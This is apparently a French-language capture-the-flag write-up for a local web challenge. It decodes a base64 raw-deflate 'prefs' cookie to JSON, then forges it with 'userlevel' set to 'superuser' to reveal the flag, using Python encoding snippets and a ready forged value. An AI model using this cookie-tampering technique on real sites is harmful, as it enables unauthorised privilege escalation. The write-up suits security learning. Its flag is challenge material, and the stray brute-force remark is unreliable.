📝 Write-up – Cookie Forger

Name: Flag-O-Matic 3000   
Category: Web   
Difficulty: Easy+   
Author: lil_pwny   

Lancement:   
y'avait des problemes avec le Docker, le + simple est de run avec : 
```
php -S 127.0.0.1:8080
```

Description   

Tu veux le flag ? Va le chercher.


Recon

On commence par visiter index.php :

    Un formulaire permet de saisir un username et de sélectionner un thème.

    L’utilisateur est redirigé vers chamber.php.

    On observe deux cookies créés : username et prefs.


Cookie Analysis

En inspectant les cookies :

```
Set-Cookie: prefs=q1YqyUjNTVWyUsrJTM8oUdJRKi1OLcpJLUvNAYolJRZnJivVAgA%3D; path=/
```

Le contenu de prefs ressemble à du base64. On le décode :

```
echo "q1YqyUjNTVWyUsrJTM8oUdJRKi1OLcpJLUvNAYolJRZnJivVAgA=" | base64 -d | hexdump -C
```

Résultat : données binaires compressées.

On soupçonne une compression gzip/deflate. Essayons de l’inflater :


```
import zlib, base64

prefs = "q1YqyUjNTVWyUsrJTM8oUdJRKi1OLcpJLUvNAYolJRZnJivVAgA="
decompressed = zlib.decompress(base64.b64decode(prefs), -zlib.MAX_WBITS)
print(decompressed.decode())
```

Résultat :

```
{"theme":"light","userlevel":"basic"}
```

Privilege Escalation

En analysant le cookie (et en bruteforcant avec burp et SecLists/Usernames/top-usernames-shortlist.txt ), on découvre qu'il suffit donc de modifier le cookie prefs en :

```
{"theme":"light","userlevel":"superuser"}
```
Avec l'encodage ca revient a : 

```
payload = {"theme": "light", "userlevel": "superuser"}
compressed = zlib.compress(json.dumps(payload).encode())[2:-4]  # simulate gzdeflate
encoded = base64.b64encode(compressed).decode()
print(encoded)
```

Résultat : 

```
q1YqyUjNTVWyUlDKyUzPKFHSUVAqLU4tykktS80BiRaXFqQWgUSUagE=
```

On remplace le cookie prefs dans le navigateur par cette valeur.

Flag 

En rechargeant chamber.php avec le cookie modifié, le flag apparaît :

AMSI{S3rial1z3d_C00ki3_Pr1vEsc_B4s364_GZ!}
